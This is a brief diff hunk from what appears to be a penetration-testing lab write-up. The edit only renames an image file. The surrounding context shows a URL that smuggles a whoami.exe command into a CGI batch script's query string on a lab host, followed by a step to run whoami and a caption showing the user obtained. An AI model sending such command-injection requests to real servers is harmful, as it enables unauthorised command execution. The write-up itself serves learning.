@@ -285,5 +285,5 @@ http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.e
 3. try to run whoami
    1.
 
-       <figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption><p>feldspar\omen</p></figcaption></figure>
+       <figure><img src="../../../.gitbook/assets/image (13) (2).png" alt=""><figcaption><p>feldspar\omen</p></figcaption></figure>
 
